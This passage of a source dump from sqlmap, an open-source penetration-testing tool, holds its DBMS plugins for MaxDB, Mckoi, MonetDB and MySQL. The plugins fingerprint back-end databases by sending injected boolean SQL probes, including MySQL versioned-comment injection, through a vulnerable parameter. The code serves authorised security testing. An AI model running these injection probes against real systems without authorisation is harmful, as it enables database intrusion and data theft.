inject\nfrom lib.request.connect import Connect as Request\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MAXDB)\n\n    def _versionCheck(self):\n        infoMsg = \"executing %s SYSINFO version check\" % DBMS.MAXDB\n        logger.info(infoMsg)\n\n        query = agent.prefixQuery(\"/* NoValue */\")\n        query = agent.suffixQuery(query)\n        payload = agent.payload(newValue=query)\n        result = Request.queryPage(payload)\n\n        if not result:\n            warnMsg = \"unable to perform %s version check\" % DBMS.MAXDB\n            logger.warning(warnMsg)\n\n            return None\n\n        minor, major = None, None\n\n        for version in (6, 7):\n            result = inject.checkBooleanExpression(\"%d=(SELECT MAJORVERSION FROM SYSINFO.VERSION)\" % version)\n\n            if result:\n                major = version\n\n        for version in xrange(0, 10):\n            result = inject.checkBooleanExpression(\"%d=(SELECT MINORVERSION FROM SYSINFO.VERSION)\" % version)\n\n            if result:\n                minor = version\n\n        if major and minor:\n            return \"%s.%s\" % (major, minor)\n        else:\n            return None\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        blank = \" \" * 15\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.MAXDB\n            return value\n\n        actVer = Format.getDbms() + \" (%s)\" % self._versionCheck()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            value += \"\\n%sbanner parsing fingerprint: -\" % blank\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(MAXDB_ALIASES):\n            setDbms(DBMS.MAXDB)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.MAXDB\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"ALPHA(NULL) IS NULL\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.MAXDB\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"MAPCHAR(NULL,1,DEFAULTMAP) IS NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.MAXDB\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.MAXDB)\n\n            self.getBanner()\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.MAXDB\n            logger.warning(warnMsg)\n\n            return False\n\n    def forceDbmsEnum(self):\n        if conf.db:\n            conf.db = conf.db.upper()\n        else:\n            conf.db = \"USER\"\n\n        if conf.tbl:\n            conf.tbl = conf.tbl.upper()\n", "plugins/dbms/maxdb/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on SAP MaxDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on SAP MaxDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on SAP MaxDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on SAP MaxDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/maxdb/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on SAP MaxDB reading of files is not supported\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on SAP MaxDB writing of files is not supported\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/maxdb/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import MAXDB_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.maxdb.enumeration import Enumeration\nfrom plugins.dbms.maxdb.filesystem import Filesystem\nfrom plugins.dbms.maxdb.fingerprint import Fingerprint\nfrom plugins.dbms.maxdb.syntax import Syntax\nfrom plugins.dbms.maxdb.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass MaxDBMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines SAP MaxDB methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = MAXDB_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.MAXDB] = Syntax.escape\n", "plugins/dbms/mckoi/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on Mckoi it is not possible to get the banner\"\n        logger.warning(warnMsg)\n\n        return None\n\n    def getCurrentUser(self):\n        warnMsg = \"on Mckoi it is not possible to enumerate the current user\"\n        logger.warning(warnMsg)\n\n    def getCurrentDb(self):\n        warnMsg = \"on Mckoi it is not possible to get name of the current database\"\n        logger.warning(warnMsg)\n\n    def isDba(self, user=None):\n        warnMsg = \"on Mckoi it is not possible to test if current user is DBA\"\n        logger.warning(warnMsg)\n\n    def getUsers(self):\n        warnMsg = \"on Mckoi it is not possible to enumerate the users\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getPasswordHashes(self):\n        warnMsg = \"on Mckoi it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on Mckoi it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getDbs(self):\n        warnMsg = \"on Mckoi it is not possible to enumerate databases (use only '--tables')\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchDb(self):\n        warnMsg = \"on Mckoi it is not possible to search databases\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchTable(self):\n        warnMsg = \"on Mckoi it is not possible to search tables\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchColumn(self):\n        warnMsg = \"on Mckoi it is not possible to search columns\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def search(self):\n        warnMsg = \"on Mckoi search option is not available\"\n        logger.warning(warnMsg)\n\n    def getHostname(self):\n        warnMsg = \"on Mckoi it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on Mckoi it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/mckoi/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on Mckoi it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/mckoi/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n\n        return expression\n", "plugins/dbms/mckoi/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import MCKOI_ALIASES\nfrom lib.core.settings import MCKOI_DEFAULT_SCHEMA\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MCKOI)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.MCKOI\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(MCKOI_ALIASES):\n            setDbms(DBMS.MCKOI)\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.MCKOI\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"DATEOB()>=DATEOB(NULL)\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.MCKOI\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"ABS(1/0)>ABS(0/1)\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.MCKOI\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.MCKOI)\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.MCKOI\n            logger.warning(warnMsg)\n\n            return False\n\n    def forceDbmsEnum(self):\n        conf.db = MCKOI_DEFAULT_SCHEMA\n", "plugins/dbms/mckoi/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Mckoi it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Mckoi it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Mckoi it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Mckoi it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/mckoi/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Mckoi it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Mckoi it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/mckoi/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import MCKOI_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.mckoi.enumeration import Enumeration\nfrom plugins.dbms.mckoi.filesystem import Filesystem\nfrom plugins.dbms.mckoi.fingerprint import Fingerprint\nfrom plugins.dbms.mckoi.syntax import Syntax\nfrom plugins.dbms.mckoi.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass MckoiMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Mckoi methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = MCKOI_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.MCKOI] = Syntax.escape\n", "plugins/dbms/monetdb/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on MonetDB it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getStatements(self):\n        warnMsg = \"on MonetDB it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on MonetDB it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on MonetDB it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getHostname(self):\n        warnMsg = \"on MonetDB it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n", "plugins/dbms/monetdb/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import pymonetdb\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/gijzelaerr/pymonetdb\n    User guide: https://pymonetdb.readthedocs.io/en/latest/index.html\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: Mozilla Public License 2.0\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = pymonetdb.connect(hostname=self.hostname, username=self.user, password=self.password, database=self.db, port=self.port, connect_timeout=conf.timeout)\n        except pymonetdb.OperationalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except pymonetdb.ProgrammingError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n        except (pymonetdb.OperationalError, pymonetdb.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except pymonetdb.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/monetdb/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CODE(97)||CODE(98)||CODE(99)||CODE(100)||CODE(101)||CODE(102)||CODE(103)||CODE(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CODE(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/monetdb/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import MONETDB_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MONETDB)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.MONETDB\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(MONETDB_ALIASES):\n            setDbms(DBMS.MONETDB)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.MONETDB\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"isaurl(NULL)=false\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.MONETDB\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"CODE(0) IS NOT NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.MONETDB\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.MONETDB)\n\n            self.getBanner()\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.MONETDB\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/monetdb/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on MonetDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on MonetDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on MonetDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on MonetDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/monetdb/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    pass\n", "plugins/dbms/monetdb/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import MONETDB_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.monetdb.enumeration import Enumeration\nfrom plugins.dbms.monetdb.filesystem import Filesystem\nfrom plugins.dbms.monetdb.fingerprint import Fingerprint\nfrom plugins.dbms.monetdb.syntax import Syntax\nfrom plugins.dbms.monetdb.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass MonetDBMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines MonetDB methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = MONETDB_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.MONETDB] = Syntax.escape\n", "plugins/dbms/mysql/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    pass\n", "plugins/dbms/mysql/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import pymysql\nexcept:\n    pass\n\nimport logging\nimport struct\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/PyMySQL/PyMySQL\n    User guide: https://pymysql.readthedocs.io/en/latest/\n    Debian package: python3-pymysql\n    License: MIT\n\n    Possible connectors: http://wiki.python.org/moin/MySQL\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = pymysql.connect(host=self.hostname, user=self.user, passwd=self.password, db=self.db, port=self.port, connect_timeout=conf.timeout, use_unicode=True)\n        except (pymysql.OperationalError, pymysql.InternalError, pymysql.ProgrammingError, struct.error) as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except pymysql.ProgrammingError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        retVal = False\n\n        try:\n            self.cursor.execute(query)\n            retVal = True\n        except (pymysql.OperationalError, pymysql.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except pymysql.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n        return retVal\n\n    def select(self, query):\n        retVal = None\n\n        if self.execute(query):\n            retVal = self.fetchall()\n\n        return retVal\n", "plugins/dbms/mysql/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport binascii\n\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getOrds\nfrom lib.core.convert import getUnicode\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 0x6162636465666768 FROM foobar\"\n        True\n        >>> Syntax.escape(u\"SELECT 'abcd\\xebfgh' FROM foobar\") == \"SELECT CONVERT(0x61626364c3ab666768 USING utf8) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            if all(_ < 128 for _ in getOrds(value)):\n                return \"0x%s\" % getUnicode(binascii.hexlify(getBytes(value)))\n            else:\n                return \"CONVERT(0x%s USING utf8)\" % getUnicode(binascii.hexlify(getBytes(value, \"utf8\")))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/mysql/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import FORK\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import OS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import MYSQL_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MYSQL)\n\n    def _commentCheck(self):\n        infoMsg = \"executing %s comment injection fingerprint\" % DBMS.MYSQL\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"[RANDNUM]=[RANDNUM]/* NoValue */\")\n\n        if not result:\n            warnMsg = \"unable to perform %s comment injection\" % DBMS.MYSQL\n            logger.warning(warnMsg)\n\n            return None\n\n        # Reference: https://downloads.mysql.com/archives/community/\n        # Reference: https://dev.mysql.com/doc/relnotes/mysql/<major>.<minor>/en/\n\n        versions = (\n            (80300, 80302),  # MySQL 8.3\n            (80200, 80202),  # MySQL 8.2\n            (80100, 80102),  # MySQL 8.1\n            (80000, 80037),  # MySQL 8.0\n            (60000, 60014),  # MySQL 6.0\n            (50700, 50745),  # MySQL 5.7\n            (50600, 50652),  # MySQL 5.6\n            (50500, 50563),  # MySQL 5.5\n            (50400, 50404),  # MySQL 5.4\n            (50100, 50174),  # MySQL 5.1\n            (50000, 50097),  # MySQL 5.0\n            (40100, 40131),  # MySQL 4.1\n            (40000, 40032),  # MySQL 4.0\n            (32300, 32359),  # MySQL 3.23\n            (32200, 32235),  # MySQL 3.22\n        )\n\n        found = False\n        for candidate in versions:\n            result = inject.checkBooleanExpression(\"[RANDNUM]=[RANDNUM]/*!%d AND [RANDNUM1]=[RANDNUM2]*/\" % candidate[0])\n\n            if not result:\n                found = True\n                break\n\n        if found:\n            for version in xrange(candidate[1], candidate[0] - 1, -1):\n                version = getUnicode(version)\n                result = inject.checkBooleanExpression(\"[RANDNUM]=[RANDNUM]/*!%s AND [RANDNUM1]=[RANDNUM2]*/\" % version)\n\n                if not result:\n                    if version[0] == \"3\":\n                        midVer = version[1:3]\n                    else:\n                        midVer = version[2]\n\n                    trueVer = \"%s.%s.%s\" % (version[0], midVer, version[3:])\n\n                    return trueVer\n\n        return None\n\n    def getFingerprint(self):\n        fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)\n\n        if fork is None:\n            if inject.checkBooleanExpression(\"VERSION() LIKE '%MariaDB%'\"):\n                fork = FORK.MARIADB\n            elif inject.checkBooleanExpression(\"VERSION() LIKE '%TiDB%'\"):\n                fork = FORK.TIDB\n            elif inject.checkBooleanExpression(\"@@VERSION_COMMENT LIKE '%drizzle%'\"):\n                fork = FORK.DRIZZLE\n            elif inject.checkBooleanExpression(\"@@VERSION_COMMENT LIKE '%Percona%'\"):\n                fork = FORK.PERCONA\n            elif inject.checkBooleanExpression(\"AURORA_VERSION() LIKE '%'\"):            # Reference: https://aws.amazon.com/premiumsupport/knowledge-center/aurora-version-number/\n                fork = FORK.AURORA\n            else:\n                fork = \"\"\n\n            